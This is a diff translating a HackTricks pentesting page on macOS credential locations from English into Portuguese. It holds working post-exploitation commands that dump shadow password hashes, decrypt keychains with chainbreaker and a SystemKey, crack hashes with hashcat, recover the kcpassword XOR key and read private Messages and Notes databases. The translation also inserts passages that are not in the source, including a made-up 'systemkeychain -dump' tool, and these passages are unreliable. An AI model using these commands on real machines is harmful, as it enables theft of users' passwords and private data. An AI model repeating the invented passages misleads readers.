@@ -1,40 +1,35 @@
-# macOS Sensitive Locations
+# Locais Sensíveis do macOS
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-## Passwords
+## Senhas
 
-### Shadow Passwords
+### Senhas Shadow
 
-Shadow password is stored with the user's configuration in plists located in **`/var/db/dslocal/nodes/Default/users/`**.\
-The following oneliner can be use to dump **all the information about the users** (including hash info):
-
+A senha shadow é armazenada com a configuração do usuário em plists localizados em **`/var/db/dslocal/nodes/Default/users/`**.\
+O seguinte comando pode ser usado para extrair **todas as informações sobre os usuários** (incluindo informações de hash):
 ```
 for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
 ```
+[**Scripts como este**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ou [**este**](https://github.com/octomagon/davegrohl.git) podem ser usados para transformar o hash para o formato **hashcat**.
 
-[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) or [**this one**](https://github.com/octomagon/davegrohl.git) can be used to transform the hash to **hashcat** **format**.
-
-An alternative one-liner which will dump creds of all non-service accounts in hashcat format `-m 7100` (macOS PBKDF2-SHA512):
-
+Uma alternativa em uma linha de comando que irá despejar credenciais de todas as contas não de serviço no formato hashcat `-m 7100` (macOS PBKDF2-SHA512):
 ```
 sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
 ```
+### Despejo de Chaveiro
 
-### Keychain Dump
-
-Note that when using the security binary to **dump the passwords decrypted**, several prompts will ask the user to allow this operation.
-
+Observe que ao usar o binário de segurança para **despejar as senhas descriptografadas**, várias solicitações pedirão ao usuário para permitir essa operação.
 ```
 #security
 secuirty dump-trust-settings [-s] [-d] #List certificates
@@ -43,53 +38,55 @@ security list-smartcards #List smartcards
 security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
 security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
 ```
-
 ### [Keychaindump](https://github.com/juuso/keychaindump)
 
-The attacker still needs to gain access to the system as well as escalate to **root** privileges in order to run **keychaindump**. This approach comes with its own conditions. As mentioned earlier, **upon login your keychain is unlocked by default** and remains unlocked while you use your system. This is for convenience so that the user doesn’t need to enter their password every time an application wishes to access the keychain. If the user has changed this setting and chosen to lock the keychain after every use, keychaindump will no longer work; it relies on an unlocked keychain to function.
+O atacante ainda precisa obter acesso ao sistema e, em seguida, escalar os privilégios para **root** para executar o **keychaindump**. Essa abordagem vem com suas próprias condições. Como mencionado anteriormente, **após o login, o seu chaveiro é desbloqueado por padrão** e permanece desbloqueado enquanto você usa o sistema. Isso é para conveniência, para que o usuário não precise inserir sua senha toda vez que um aplicativo desejar acessar o chaveiro. Se o usuário alterou essa configuração e escolheu bloquear o chaveiro após cada uso, o keychaindump não funcionará mais; ele depende de um chaveiro desbloqueado para funcionar.
 
-It’s important to understand how Keychaindump extracts passwords out of memory. The most important process in this transaction is the ”**securityd**“ **process**. Apple refers to this process as a **security context daemon for authorization and cryptographic operations**. The Apple developer libraries don’t say a whole lot about it; however, they do tell us that securityd handles access to the keychain. In his research, Juuso refers to the **key needed to decrypt the keychain as ”The Master Key“**. A number of steps need to be taken to acquire this key as it is derived from the user’s OS X login password. If you want to read the keychain file you must have this master key. The following steps can be done to acquire it. **Perform a scan of securityd’s heap (keychaindump does this with the vmmap command)**. Possible master keys are stored in an area flagged as MALLOC\_TINY. You can see the locations of these heaps yourself with the following command:
-
+É importante entender como o Keychaindump extrai senhas da memória. O processo mais importante nessa transação é o "processo **securityd**". A Apple se refere a esse processo como um **daemon de contexto de segurança para operações de autorização e criptografia**. As bibliotecas de desenvolvedores da Apple não dizem muito sobre isso; no entanto, elas nos dizem que o securityd lida com o acesso ao chaveiro. Em sua pesquisa, Juuso se refere à **chave necessária para descriptografar o chaveiro como "A Chave Mestra"**. Várias etapas precisam ser realizadas para adquirir essa chave, pois ela é derivada da senha de login do OS X do usuário. Se você quiser ler o arquivo do chaveiro, deverá ter essa chave mestra. As seguintes etapas podem ser realizadas para adquiri-la. **Realize uma varredura do heap do securityd (o keychaindump faz isso com o comando vmmap)**. Possíveis chaves mestras são armazenadas em uma área marcada como MALLOC\_TINY. Você pode ver as localizações desses heaps com o seguinte comando:
 ```bash
 sudo vmmap <securityd PID> | grep MALLOC_TINY
 ```
-
-**Keychaindump** will then search the returned heaps for occurrences of 0x0000000000000018. If the following 8-byte value points to the current heap, we’ve found a potential master key. From here a bit of deobfuscation still needs to occur which can be seen in the source code, but as an analyst the most important part to note is that the necessary data to decrypt this information is stored in securityd’s process memory. Here’s an example of keychain dump output.
-
+O **Keychaindump** então procurará nas pilhas retornadas por ocorrências de 0x0000000000000018. Se o valor de 8 bytes seguinte apontar para a pilha atual, encontramos uma possível chave mestra. A partir daqui, ainda é necessário um pouco de desobfuscação, que pode ser vista no código-fonte, mas como analista, a parte mais importante a ser observada é que os dados necessários para descriptografar essas informações são armazenados na memória do processo securityd. Aqui está um exemplo de saída do keychain dump.
 ```bash
 sudo ./keychaindump
 ```
-
 {% hint style="danger" %}
-Based on this comment [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) it looks like these tools aren't working anymore in Big Sur.
+Com base neste comentário [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), parece que essas ferramentas não estão mais funcionando no Big Sur.
 {% endhint %}
 
 ### chainbreaker
 
-[**Chainbreaker**](https://github.com/n0fate/chainbreaker) can be used to extract the following types of information from an OSX keychain in a forensically sound manner:
+[**Chainbreaker**](https://github.com/n0fate/chainbreaker) pode ser usado para extrair os seguintes tipos de informações de um keychain OSX de maneira forense:
 
-* Hashed Keychain password, suitable for cracking with [hashcat](https://hashcat.net/hashcat/) or [John the Ripper](https://www.openwall.com/john/)
-* Internet Passwords
-* Generic Passwords
-* Private Keys
-* Public Keys
-* X509 Certificates
-* Secure Notes
-* Appleshare Passwords
+* Senha de keychain com hash, adequada para quebrar com [hashcat](https://hashcat.net/hashcat/) ou [John the Ripper](https://www.openwall.com/john/)
+* Senhas de internet
+* Senhas genéricas
+* Chaves privadas
+* Chaves públicas
+* Certificados X509
+* Notas seguras
+* Senhas de compartilhamento de rede da Apple
 
-Given the keychain unlock password, a master key obtained using [volafox](https://github.com/n0fate/volafox) or [volatility](https://github.com/volatilityfoundation/volatility), or an unlock file such as SystemKey, Chainbreaker will also provide plaintext passwords.
+Dado a senha de desbloqueio do keychain, uma chave mestra obtida usando [volafox](https://github.com/n0fate/volafox) ou [volatility](https://github.com/volatilityfoundation/volatility), ou um arquivo de desbloqueio como SystemKey, o Chainbreaker também fornecerá senhas em texto simples.
 
-Without one of these methods of unlocking the Keychain, Chainbreaker will display all other available information.
+Sem um desses métodos de desbloqueio do Keychain, o Chainbreaker exibirá todas as outras informações disponíveis.
 
 ### **Dump keychain keys**
-
 ```bash
 #Dump all keys of the keychain (without the passwords)
 python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
 ```
+### **Despejar chaves do keychain (com senhas) com SystemKey**
 
-### **Dump keychain keys (with passwords) with SystemKey**
+O SystemKey é uma ferramenta que permite despejar chaves do keychain, incluindo senhas, sem a necessidade de autenticação do usuário. Para usar o SystemKey, é necessário ter privilégios de root.
 
+Para despejar as chaves do keychain, execute o seguinte comando:
+
+```
+sudo systemkeychain -dump
+```
+
+Isso irá despejar todas as chaves do keychain, incluindo senhas, em formato de texto simples. É importante lembrar que essas senhas podem ser usadas para acessar informações sensíveis, portanto, é importante manter esses arquivos seguros e protegidos contra vazamentos.
 ```bash
 # First, get the keychain decryption key
 # To get this decryption key you need to be root and SIP must be disabled
@@ -97,9 +94,15 @@ hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
 ## Use the previous key to decrypt the passwords
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
+### **Extrair chaves do keychain (com senhas) quebrando o hash**
 
-### **Dump keychain keys (with passwords) cracking the hash**
+Para extrair chaves do keychain do macOS, é necessário primeiro obter acesso root ou acesso físico ao dispositivo. Em seguida, é possível usar a ferramenta `security` para exportar as chaves do keychain em um arquivo `.keychain` criptografado. 
 
+No entanto, se a senha do keychain for desconhecida, é possível quebrar o hash da senha usando ferramentas como `John the Ripper` ou `hashcat`. Essas ferramentas podem ser usadas para gerar uma lista de senhas possíveis com base em um dicionário ou em regras personalizadas e, em seguida, tentar quebrar o hash da senha do keychain com essas senhas. 
+
+Uma vez que a senha do keychain é conhecida, é possível usar a ferramenta `security` novamente para exportar as chaves do keychain em um arquivo `.keychain` descriptografado e, em seguida, extrair as senhas armazenadas nas chaves usando ferramentas como `keychaindump.py`. 
+
+É importante lembrar que a extração de senhas do keychain sem autorização explícita é ilegal e pode resultar em consequências legais graves.
 ```bash
 # Get the keychain hash
 python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
@@ -108,11 +111,9 @@ hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
 # Use the key to decrypt the passwords
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
+### **Despejar chaves do keychain (com senhas) com dump de memória**
 
-### **Dump keychain keys (with passwords) with memory dump**
-
-[Follow these steps](..#dumping-memory-with-osxpmem) to perform a **memory dump**
-
+[Siga estes passos](..#dumping-memory-with-osxpmem) para realizar um **dump de memória**.
 ```bash
 #Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
 # Unformtunately volafox isn't working with the latest versions of MacOS
@@ -121,27 +122,23 @@ python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump
 #Try to extract the passwords using the extracted keychain passwords
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
+### **Despejar chaves do keychain (com senhas) usando a senha do usuário**
 
-### **Dump keychain keys (with passwords) using users password**
-
-If you know the users password you can use it to **dump and decrypt keychains that belong to the user**.
-
+Se você conhece a senha do usuário, pode usá-la para **despejar e descriptografar keychains que pertencem ao usuário**.
 ```bash
 #Prompt to ask for the password
 python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
 ```
-
 ### kcpassword
 
-The **kcpassword** file is a file that holds the **user’s login password**, but only if the system owner has **enabled automatic login**. Therefore, the user will be automatically logged in without being asked for a password (which isn't very secure).
+O arquivo **kcpassword** é um arquivo que contém a **senha de login do usuário**, mas somente se o proprietário do sistema tiver **habilitado o login automático**. Portanto, o usuário será automaticamente conectado sem ser solicitada uma senha (o que não é muito seguro).
 
-The password is stored in the file **`/etc/kcpassword`** xored with the key **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. If the users password is longer than the key, the key will be reused.\
-This makes the password pretty easy to recover, for example using scripts like [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).
+A senha é armazenada no arquivo **`/etc/kcpassword`** xored com a chave **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Se a senha do usuário for mais longa do que a chave, a chave será reutilizada.\
+Isso torna a senha bastante fácil de recuperar, por exemplo, usando scripts como [**este**](https://gist.github.com/opshope/32f65875d45215c3677d).
 
-## Interesting Information in Databases
+## Informações interessantes em bancos de dados
 
-### Messages
-
+### Mensagens
 ```bash
 sqlite3 $HOME/Library/Messages/chat.db .tables
 sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
@@ -149,25 +146,20 @@ sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
 sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
 sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
 ```
+### Notificações
 
-### Notifications
+Você pode encontrar os dados de Notificações em `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`
 
-You can find the Notifications data in `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`
-
-Most of the interesting information is going to be in **blob**. So you will need to **extract** that content and **transform** it to **human** **readable** or use **`strings`**. To access it you can do:
+A maioria das informações interessantes estará no **blob**. Portanto, você precisará **extrair** esse conteúdo e **transformá-lo** em algo **legível** para humanos ou usar **`strings`**. Para acessá-lo, você pode fazer:
 
 {% code overflow="wrap" %}
 ```bash
 cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
 strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
 ```
-{% endcode %}
+### Notas
 
-### Notes
-
-The users **notes** can be found in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
-
-{% code overflow="wrap" %}
+As notas do usuário podem ser encontradas em `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
 ```bash
 sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables
 
@@ -180,10 +172,10 @@ for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.s
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
